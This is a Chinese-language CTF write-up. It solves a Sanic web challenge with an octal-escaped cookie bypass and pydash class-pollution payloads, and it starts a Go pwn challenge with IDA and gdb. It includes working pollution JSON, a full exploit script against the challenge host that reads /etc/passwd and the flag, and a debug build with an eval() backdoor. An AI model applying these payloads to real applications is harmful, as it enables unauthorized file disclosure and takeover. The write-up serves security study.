# web

## sanic

查看源码，访问/src

```python
from sanic import Sanic
from sanic.response import text, html
from sanic_session import Session
import pydash
# pydash==5.1.2


class Pollute:
    def __init__(self):
        pass


app = Sanic(__name__)
app.static("/static/", "./static/")
Session(app)


@app.route('/', methods=['GET', 'POST'])
async def index(request):
    return html(open('static/index.html').read())


@app.route("/login")
async def login(request):
    user = request.cookies.get("user")
    if user.lower() == 'adm;n':
        request.ctx.session['admin'] = True
        return text("login success")

    return text("login fail")


@app.route("/src")
async def src(request):
    return text(open(__file__).read())


@app.route("/admin", methods=['GET', 'POST'])
async def admin(request):
    if request.ctx.session.get('admin') == True:
        key = request.json['key']
        value = request.json['value']
        if key and value and type(key) is str and '_.' not in key:
            pollute = Pollute()
            pydash.set_(pollute, key, value)
            return text("success")
        else:
            return text("forbidden")

    return text("forbidden")


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

> **Sanic** 是一个用于Python的异步Web框架，设计灵感来自于Flask，但它利用了Python的`asyncio`库，允许处理异步请求。这意味着Sanic可以处理大量并发请求，并提供更高的性能和扩展性，尤其适用于需要高吞吐量和低延迟的应用。

> **Pydash** 是一个Python实用工具库，提供了类似于JavaScript的Lodash库的功能。它包含了大量用于处理和操作数据的函数，包括对象操作、数组处理、集合运算、字符串操作等。Pydash让你可以更方便地进行数据转换和处理，减少手动编写代码的重复性和错误。

访问/admin，回显forbidden

结合源码，需要绕过session

### WAF1

```python
/login
if user.lower() == 'adm;n' # 绕过此处waf，可以将session中admin键值设置为True
分号截断
```

审计sanic源码，可以用八进制编码绕过`adm;n=adm\073n`

[sanic/sanic/cookies/request.py at main · sanic-org/sanic (github.com)](https://github.com/sanic-org/sanic/blob/main/sanic/cookies/request.py)

![image-20240527190908894](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240527190908894.png)

```python
COOKIE_NAME_RESERVED_CHARS = re.compile(
    '[\x00-\x1f\x7f-\xff()<>@,;:\\\\"/[\\]?={} \x09]'
)
OCTAL_PATTERN = re.compile(r"\\[0-3][0-7][0-7]")
QUOTE_PATTERN = re.compile(r"[\\].")
```

![image-20240527190501245](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240527190501245.png)

拿到session

![image-20240527210536274](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240527210536274.png)

### WAF2

```python
/admin
if request.ctx.session.get('admin') == True # session上下文中admin键值是否为True
if key and value and type(key) is str and '_.' not in key # 设置key、value，key为字符串，key中无_.避免原型链污染
	# 创建对象，调用原型链
    pollute = Pollute()
    pydash.set_(pollute, key, value)

# key和valu是POST型json格式传参
key = request.json['key']
value = request.json['value']
```

原型链污染绕过`__init__\\\\.__globals__`，类似转义的方式去绕过

**原型链污染1：/src**

![image-20240527211847815](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240527211847815.png)

带session在/admin处POST传参进行污染

```py
{"key":".__init__\\\\.__globals__\\\\.__file__","value": "/etc/passwd"}
```

![image-20240527212244231](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240527212244231.png)

访问/src，成功被污染

<img src="https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240527212427385.png" alt="image-20240527212427385" style="zoom:50%;" />

**核心原型链污染**

只要将directory污染为根目录，directory_view污染为True，就可以看到根目录的所有文件，就能找到flag文件

- 开启列目录功能
- 查看flag文件名称，污染`__file__`进行读取

```python
app.static("/static/", "./static/") # 源码可疑路由，跟进源码文件
```

![image-20240527213233281](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240527213233281.png)

**directory_view**为true，开启列目录功能

**directory_handler**可以获取指定目录

跟进directory_handler，发现调用了Directory_handler类，源码跟进找到**上述两个目标污染对象**

![image-20240527213808534](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240527213808534.png)

### 本地调试

需要进一步找到注册路由

sanic框架通过`app.router.name_index`获取注册路由

通过控制台打印，获取注册路由

```python
# 修改源码便于调试
from sanic import Sanic
from sanic.response import text, html
# from sanic_session import Session
import pydash
# pydash==5.1.2


class Pollute:
    def __init__(self):
        pass


app = Sanic(__name__)
app.static("/static/", "./static/")
# Session(app)


# @app.route('/', methods=['GET', 'POST'])
# async def index(request):
#     return html(open('static/index.html').read())


# @app.route("/login")
# async def login(request):
#     user = request.cookies.get("user")
#     if user.lower() == 'adm;n':
#         request.ctx.session['admin'] = True
#         return text("login success")
#
#     return text("login fail")


@app.route("/src")
async def src(request):
    eval(request.args.get('xh1xxhg'))
    return text(open(__file__).read())


@app.route("/admin", methods=['GET', 'POST'])
async def admin(request):
    if request.ctx.session.get('admin') == True:
        key = request.json['key']
        value = request.json['value']
        if key and value and type(key) is str and '_.' not in key:
            pollute = Pollute()
            pydash.set_(pollute, key, value)
            return text("success")
        else:
            return text("forbidden")

    return text("forbidden")


if __name__ == '__main__':
    app.run(host='0.0.0.0')
```

访问`/src?xh1xxhg=print(app.router.name_index)`获取所有注册路由

```python
{'__mp_main__.static': <Route: name=__mp_main__.static path=static/<__file_uri__:path>>, '__mp_main__.src': <Route: name=__mp_main__.src path=src>, '__mp_main__.admin': <Route: name=__mp_main__.admin path=admin>}
```

提取出`'__mp_main__.static': <Route: name=__mp_main__.static path=static/<__file_uri__:path>>`，需要继续**找到DirectoryHandler是如何调用到这个路由**的，可能与name_index解析有关

Find in files搜索name_index，找到赋值处下断点，调试

![image-20240527220029916](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240527220029916.png)

![image-20240527220127154](C:\Users\LENOVO\AppData\Roaming\Typora\typora-user-images\image-20240527220127154.png)

**本地访问**`/src?xh1xxhg=print(app.router.name_index).handler.keywords['directory_handler']`进入DirectoryHandler对象

找到**污染directory_view属性的路由**`/src?xh1xxhg=print(app.router.name_index).handler.keywords['directory_handler'].directory_view`

```python
# 污染directory_view值
{"key":"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view","value": True}
```

接下来找**污染directory对象的路由**，元组parts赋值directory

![image-20240527221117124](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240527221117124.png)

![image-20240527221301701](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240527221301701.png)

![image-20240527221352852](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240527221352852.png)

```python
# 污染directory对象返回值
{"key":"__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts","value": ["/"]}
```

### exp

python底层调用时会对\进行双重转义，所以session得手动获取

编写exp集成payload利用

```python
import requests

docke = "https://47e53c39-3e56-4ec7-b112-13a8cb378f34.challenge.ctf.show"
# Prototype pollute
# First exploit
# 开启列目录功能
data = {"key": "__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view","value": True}

# Secong exploit
# 污染目录对象，污染路径为根目录
# data = {"key": "__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts","value": ["/"]}

# Third exploit
# 读取flag
data = {"key": "__init__\\\\.__globals__\\\\.__file__","value": "/24bcbd0192e591d6ded1_flag"}

cookie = {"session": "0de59a9d92af43d5b12860492fd581b0"}

response = requests.post(url=f'{docke}/admin', json=data,
                         cookies=cookie)
flag = requests.get(url=f'{docke}/src', cookies=cookie)

print(response.text)
print(flag.text)
```

`https://47e53c39-3e56-4ec7-b112-13a8cb378f34.challenge.ctf.show/static/`

![image-20240528003011040](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240528003011040.png)

`https://47e53c39-3e56-4ec7-b112-13a8cb378f34.challenge.ctf.show/src`

![image-20240528003932797](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240528003932797.png)

# pwn

## gostack

拉入DIE，64位，Go语言

![image-20240528215119653](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240528215119653.png)

拉入IDA Pro64位，**Alt+F7运行go_parser.py脚本逆向解析Golang程序**

拉入kali，存在一个输入点magic message

所以肯定会有溢出进行覆盖

### 方法1

go_parser.py脚本解析完程序后，显示出完整函数名

![image-20240529200934730](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240529200934730.png)

搜索main函数，F5反编译

![image-20240529201025450](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240529201025450.png)

点入main_main()函数

![image-20240529201130384](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240529201130384.png)



### 方法2

![image-20240528221147790](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240528221147790.png)

通过给定的字符串，找到程序内部的运行逻辑

Shift+F12字符串模式，Ctrl+F搜索

![image-20240528221606138](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240528221606138.png)

![image-20240528222136454](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240528222136454.png)

点到字符串的交叉引用地址按x，查看图形视图

![image-20240529175340774](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240529175340774.png)

反编译比较困难

Esc回到汇编模式，猜测数据在text段，找到输入点的调用地址

![image-20240529181953923](https://cdn.jsdelivr.net/gh/Xh1Xxhg/Pictures@main/CTF/image-20240529181953923.png)

汇编比较难读懂，于是用gdb调试下断点

```bash
gdb pwn
b *0x4A098C
```

